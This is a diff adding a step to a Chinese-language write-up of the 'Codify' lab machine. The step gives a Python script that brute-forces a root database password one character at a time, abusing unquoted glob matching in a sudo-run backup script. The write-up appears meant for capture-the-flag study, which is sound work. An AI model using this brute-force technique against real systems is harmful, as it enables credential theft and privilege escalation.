@@ -49,3 +49,23 @@ Codify
       這意味著使用者輸入 (USER_PASS) 被視為一種模式，如果它包含像 * 或 ? 這樣的全域字符，它可能會匹配意外的字串。
       例如，如果實際密碼（DB_PASS）是password123，並且使用者輸入*作為其密碼（USER_PASS），則模式匹配將成功，因為*匹配任何字串，從而導致未經授權的存取。
       這意味著我們可以暴力破解 DB_PASS 中的每個字元。
+
+      12.使用腳本進行密碼破解
+
+      import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = ""
+found = False
+
+while not found:
+    for character in all:
+        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
